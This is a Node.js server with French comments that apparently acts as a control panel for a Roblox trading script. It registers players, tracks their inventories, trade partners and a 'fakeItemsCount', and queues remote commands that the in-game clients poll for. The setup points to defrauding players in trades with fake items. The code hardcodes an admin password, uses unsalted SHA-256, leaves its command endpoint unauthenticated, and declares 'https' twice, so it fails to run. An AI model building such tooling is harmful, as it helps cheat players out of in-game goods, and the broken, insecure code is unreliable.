const express = require('express');
const http = require('http');
const https = require('https');
const WebSocket = require('ws');
const path = require('path');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

const app = express();

// ===== CONFIGURATION SÉCURITÉ =====
const JWT_SECRET = process.env.JWT_SECRET || 'trade-bridge-jwt-secret-' + crypto.randomBytes(32).toString('hex');
const ADMIN_USER = 'admin_7x9K#mQ2$vL';
const ADMIN_PASS_HASH = crypto.createHash('sha256').update('BrainR0t!2024$Secure#99').digest('hex');
const RECAPTCHA_SECRET = process.env.RECAPTCHA_SECRET || '6LeIxAcTAAAAAGG-vFI1TnRWxMZNFuojJ4WifJWe';

// Fonction helper pour vérifier le hash d'un password
function hashPassword(password) {
  return crypto.createHash('sha256').update(password).digest('hex');
}

// Middleware CORS sécurisé
app.use((req, res, next) => {
  res.header('X-Content-Type-Options', 'nosniff');
  res.header('X-Frame-Options', 'DENY');
  res.header('X-XSS-Protection', '1; mode=block');
  res.header('Referrer-Policy', 'strict-origin-when-cross-origin');
  next();
});
app.use(express.json());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const PORT = process.env.PORT || 3000;

// Servir les fichiers statiques de l'interface
app.use(express.static(path.join(__dirname, 'public')));

// Health check route
app.get('/', (req, res) => {
  res.send('Trade Bridge Server is running!');
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', robloxClients: robloxClients.size, browserClients: browserClients.size });
});

// ===== AUTHENTICATION =====
// Route de login avec vérification reCAPTCHA
app.post('/api/login', async (req, res) => {
  try {
    const { username, password, recaptchaToken } = req.body;
    
    if (!username || !password || !recaptchaToken) {
      return res.status(400).json({ success: false, error: 'missing fields' });
    }
    
    // Vérification reCAPTCHA
    const recaptchaVerify = await new Promise((resolve) => {
      const postData = `secret=${RECAPTCHA_SECRET}&response=${recaptchaToken}`;
      const request = https.request({
        hostname: 'www.google.com',
        path: '/recaptcha/api/siteverify',
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(postData)
        }
      }, (response) => {
        let data = '';
        response.on('data', chunk => data += chunk);
        response.on('end', () => {
          try {
            resolve(JSON.parse(data));
          } catch { resolve({ success: false }); }
        });
      });
      request.on('error', () => resolve({ success: false }));
      request.write(postData);
      request.end();
    });
    
    if (!recaptchaVerify.success) {
      return res.status(403).json({ success: false, error: 'recaptcha failed' });
    }
    
    // Vérification credentials
    const passHash = hashPassword(password);
    if (username !== ADMIN_USER || passHash !== ADMIN_PASS_HASH) {
      return res.status(401).json({ success: false, error: 'invalid credentials' });
    }
    
    // Génération JWT
    const token = jwt.sign(
      { username, role: 'admin', iat: Date.now() },
      JWT_SECRET,
      { expiresIn: '7d' }
    );
    
    res.json({ success: true, token });
  } catch (err) {
    res.status(500).json({ success: false, error: 'server error' });
  }
});

// Vérification JWT middleware
function verifyToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  if (!authHeader) return res.status(401).json({ error: 'no token' });
  
  const token = authHeader.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'invalid token format' });
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch {
    return res.status(403).json({ error: 'invalid token' });
  }
}

// ===== ROUTES HTTP POUR ROBLOX (bypass WebSocket bloqués) =====
app.post('/api/register', (req, res) => {
  try {
    const data = req.body;
    if (!data || !data.userId) return res.json({ success: false, error: 'missing userId' });

    const uid = String(data.userId);
    robloxClients.set(uid, {
      ws: null,
      playerInfo: {
        username: String(data.username || 'Inconnu').replace(/[<>"']/g, ''),
        displayName: String(data.displayName || 'Inconnu').replace(/[<>"']/g, ''),
        userId: data.userId,
        placeId: data.placeId || '0',
        gameName: String(data.gameName || 'Unknown Game').replace(/[<>"']/g, ''),
        animalsList: Array.isArray(data.animalsList) ? data.animalsList.map(a => String(a).replace(/[<>"']/g, '')) : []
      },
      tradeInfo: {
        inTrade: data.inTrade || false,
        otherPlayer: data.otherPlayer || null,
        fakeItemsCount: data.fakeItemsCount || 0
      },
      pendingCommands: []
    });
    broadcastToBrowsers();
    res.json({ success: true });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});

app.post('/api/trade_update', (req, res) => {
  try {
    const data = req.body;
    if (!data || !data.userId) return res.json({ success: false });

    const uid = String(data.userId);
    const client = robloxClients.get(uid);
    if (client) {
      client.tradeInfo = {
        inTrade: data.inTrade,
        otherPlayer: data.otherPlayer || null,
        fakeItemsCount: data.fakeItemsCount || 0,
        isYourReady: data.isYourReady || false,
        isOtherReady: data.isOtherReady || false,
        yourOffer: data.yourOffer || [],
        otherOffer: data.otherOffer || []
      };
      broadcastToBrowsers();
    }
    res.json({ success: true });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});

app.get('/api/commands', (req, res) => {
  try {
    const userId = req.query.userid;
    if (!userId) return res.json({ commands: [] });

    const uid = String(userId);
    const client = robloxClients.get(uid);
    if (client && client.pendingCommands && client.pendingCommands.length > 0) {
      const cmds = [...client.pendingCommands];
      client.pendingCommands = [];
      res.json({ commands: cmds });
    } else {
      res.json({ commands: [] });
    }
  } catch (err) {
    res.json({ commands: [] });
  }
});

app.post('/api/command', (req, res) => {
  try {
    const data = req.body;
    if (!data || !data.targetUserId || !data.action) return res.json({ success: false });

    const client = robloxClients.get(data.targetUserId);
    if (client) {
      if (!client.pendingCommands) client.pendingCommands = [];
      client.pendingCommands.push(data);
      res.json({ success: true });
    } else {
      res.json({ success: false, error: 'client not found' });
    }
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});

// Stocker les connexions actives
const robloxClients = new Map(); // clientId -> { ws, playerInfo, tradeInfo }
const browserClients = new Set(); // set of ws browser connections

// Diffuser l'état général des joueurs connectés à tous les navigateurs ouverts
function broadcastToBrowsers() {
  const playersList = Array.from(robloxClients.entries())
    .map(([id, client]) => ({
      id,
      playerInfo: client.playerInfo || { username: 'Inconnu', userId: id },
      tradeInfo: client.tradeInfo || { inTrade: false },
      isOnline: true
    }));

  const payload = JSON.stringify({
    type: 'players_update',
    players: playersList
  });

  browserClients.forEach(browserWs => {
    if (browserWs.readyState === WebSocket.OPEN) {
      browserWs.send(payload);
    }
  });
}

// Gérer les connexions WebSocket
wss.on('connection', (ws, req) => {
  // Parsing robuste de l'URL pour gérer les routes de type /roblox ou /browser
  const parsedUrl = new URL(req.url, 'http://localhost');
  const pathname = parsedUrl.pathname;
  let clientType = pathname.replace(/^\/|\/$/g, ''); // 'roblox' ou 'browser'

  // Fallback sur les paramètres de requête si le path est vide
  if (!clientType) {
    clientType = parsedUrl.searchParams.get('type');
  }

  const clientId = parsedUrl.searchParams.get('clientId') || Math.random().toString(36).substring(2, 11);

  if (clientType === 'roblox') {
    console.log(`[ROBLOX] Nouveau client connecté : ${clientId}`);
    
    // Initialiser la structure de données pour ce client
    robloxClients.set(clientId, {
      ws,
      playerInfo: { username: 'Inconnu', displayName: 'Inconnu', userId: 0, placeId: '0' },
      tradeInfo: { inTrade: false, otherPlayer: null, fakeItemsCount: 0 }
    });

    // Écouter les messages du client Roblox
    ws.on('message', (message) => {
      try {
        const data = JSON.parse(message);
        console.log(`[ROBLOX][${clientId}] Message reçu :`, data);
        const client = robloxClients.get(clientId);
        if (!client) return;

        if (data.type === 'init') {
          // Initialisation des données du joueur
          client.playerInfo = {
            username: data.username || 'Inconnu',
            displayName: data.displayName || 'Inconnu',
            userId: data.userId || 0,
            placeId: data.placeId || '0',
            animalsList: data.animalsList || []
          };
          client.tradeInfo = {
            inTrade: data.inTrade || false,
            otherPlayer: data.otherPlayer || null,
            fakeItemsCount: data.fakeItemsCount || 0
          };
          broadcastToBrowsers();
        } else if (data.type === 'trade_update') {
          // Mise à jour de l'état d'un échange
          client.tradeInfo = {
            inTrade: data.inTrade,
            otherPlayer: data.otherPlayer || null,
            fakeItemsCount: data.fakeItemsCount || 0,
            isYourReady: data.isYourReady || false,
            isOtherReady: data.isOtherReady || false,
            yourOffer: data.yourOffer || [],
            otherOffer: data.otherOffer || []
          };
          broadcastToBrowsers();
        }
      } catch (err) {
        console.error(`[ROBLOX] Erreur lors du parsing du message de ${clientId}:`, err);
      }
    });

    ws.on('close', () => {
      console.log(`[ROBLOX] Client déconnecté : ${clientId}`);
      robloxClients.delete(clientId);
      broadcastToBrowsers();
    });

    ws.on('error', (err) => {
      console.error(`[ROBLOX][${clientId}] Erreur :`, err);
    });

  } else if (clientType === 'browser') {
    // Vérification du token JWT pour les connexions browser
    const token = parsedUrl.searchParams.get('token');
    if (!token) {
      ws.close(1008, 'authentication required');
      return;
    }
    try {
      jwt.verify(token, JWT_SECRET);
    } catch {
      ws.close(1008, 'invalid token');
      return;
    }
    
    console.log(`[BROWSER] Nouveau navigateur connecté (authentifié)`);
    browserClients.add(ws);

    // Lui envoyer instantanément la liste des joueurs en ligne
    broadcastToBrowsers();

    // Écouter les commandes envoyées depuis le navigateur
    ws.on('message', (message) => {
      try {
        const data = JSON.parse(message);
        console.log(`[BROWSER] Commande reçue :`, data);

        // Les commandes doivent cibler un joueur Roblox spécifique
        const targetClientId = String(data.targetClientId);
        const robloxClient = robloxClients.get(targetClientId);

        if (robloxClient) {
          // Stocker la commande pour que le client Roblox (HTTP polling) la récupère
          if (!robloxClient.pendingCommands) robloxClient.pendingCommands = [];
          robloxClient.pendingCommands.push(data);
          console.log(`[BRIDGE] Commande stockée pour Roblox (${String(targetClientId)}) :`, data.action);
        } else {
          console.warn(`[BRIDGE] Client Roblox cible introuvable : ${targetClientId}`);
        }
      } catch (err) {
        console.error('[BROWSER] Erreur de commande :', err);
      }
    });

    ws.on('close', () => {
      console.log(`[BROWSER] Navigateur déconnecté`);
      browserClients.delete(ws);
    });
  }
});

// Proxy d'image local pour contourner à 100% les restrictions CORS et hotlinking des avatars Roblox
const https = require('https');
app.get('/avatar/:userId', (req, res) => {
  const userId = req.params.userId;
  if (!userId || userId === '0' || userId === '1') {
    res.redirect('https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150&format=png');
    return;
  }
  
  https.get(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`, (apiRes) => {
    let data = '';
    apiRes.on('data', chunk => data += chunk);
    apiRes.on('end', () => {
      try {
        const json = JSON.parse(data);
        if (json && json.data && json.data[0] && json.data[0].imageUrl) {
          https.get(json.data[0].imageUrl, (imgRes) => {
            res.setHeader('Content-Type', 'image/png');
            imgRes.pipe(res);
          }).on('error', () => {
            res.redirect(`https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`);
          });
        } else {
          res.redirect(`https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`);
        }
      } catch (e) {
        res.redirect(`https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`);
      }
    });
  }).on('error', () => {
    res.redirect(`https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`);
  });
});

// Lancer le serveur local
server.listen(PORT, () => {
  console.log(`=======================================================`);
  console.log(`🚀 SERVEUR DE TRADING PRO LANCÉ EN LOCAL AVEC SUCCÈS 🚀`);
  console.log(`👉 Panel d'Administration : http://localhost:${PORT}`);
  console.log(`=======================================================`);
});
